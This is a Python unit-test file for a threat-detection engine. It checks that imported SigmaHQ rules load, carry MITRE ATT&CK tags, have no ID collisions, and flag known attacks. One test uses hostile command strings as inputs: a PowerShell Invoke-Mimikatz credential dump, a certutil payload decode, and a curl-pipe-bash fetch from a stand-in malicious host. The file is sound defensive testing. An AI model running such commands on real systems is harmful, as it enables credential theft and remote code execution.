"""Unit tests for imported SigmaHQ behavioral threat detection rules."""

from vinci_adr.tier1_fast.heuristics import HeuristicsEngine


def test_sigma_rule_count() -> None:
    """Verify that at least 50 Sigma rules are loaded by HeuristicsEngine."""
    engine = HeuristicsEngine()
    sigma_rules = [r for r in engine.rule_set.rules if r.id.startswith("SIG-")]
    assert len(sigma_rules) >= 50, f"Expected >= 50 Sigma rules, got {len(sigma_rules)}"


def test_sigma_mitre_tags() -> None:
    """Verify that at least 30% of imported Sigma rules contain a MITRE ATT&CK tag."""
    engine = HeuristicsEngine()
    sigma_rules = [r for r in engine.rule_set.rules if r.id.startswith("SIG-")]
    assert len(sigma_rules) > 0, "No Sigma rules found"

    tagged_rules = [r for r in sigma_rules if any(t.startswith("attack.t") for t in r.tags)]
    ratio = len(tagged_rules) / len(sigma_rules)
    assert ratio >= 0.30, (
        f"Expected >= 30% of Sigma rules to have MITRE tags, got {ratio * 100:.1f}% ({len(tagged_rules)}/{len(sigma_rules)})"
    )


def test_sigma_detects_known_attacks() -> None:
    """Verify that imported rules detect known attacks: Mimikatz, certutil decode, and curl pipe bash."""
    engine = HeuristicsEngine()

    # 1. Invoke-Mimikatz command
    mimikatz_cmd = (
        'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Mimikatz -DumpCreds"'
    )
    matches_mimikatz = engine.scan(mimikatz_cmd)
    assert len(matches_mimikatz) >= 1
    assert any("mimikatz" in m.rule_name.lower() for m in matches_mimikatz)

    # 2. certutil -decode command
    certutil_cmd = "certutil.exe -decode payload.txt output.exe"
    matches_certutil = engine.scan(certutil_cmd)
    assert len(matches_certutil) >= 1
    assert any("certutil" in m.rule_name.lower() for m in matches_certutil)

    # 3. curl | bash remote execution
    curl_cmd = "curl -s https://evil.sh/malicious.sh | bash"
    matches_curl = engine.scan(curl_cmd)
    assert len(matches_curl) >= 1
    assert any("curl" in m.rule_name.lower() for m in matches_curl)


def test_no_id_collision_with_existing() -> None:
    """Verify that no SIG-* IDs collide with existing ADR-* or CLT-* rule IDs."""
    engine = HeuristicsEngine()
    all_rules = engine.rule_set.rules
    all_ids = [r.id for r in all_rules]

    sigma_ids = [i for i in all_ids if i.startswith("SIG-")]
    non_sigma_ids = [i for i in all_ids if not i.startswith("SIG-")]

    assert len(sigma_ids) > 0, "No Sigma IDs found"
    assert len(non_sigma_ids) > 0, "No non-Sigma IDs found"

    # Verify rule ID uniqueness across entire engine
    assert len(all_ids) == len(set(all_ids)), "Duplicate rule IDs detected across ruleset"

    # Verify disjointness
    assert set(sigma_ids).isdisjoint(set(non_sigma_ids)), (
        "Collision found between Sigma IDs and existing rule IDs"
    )
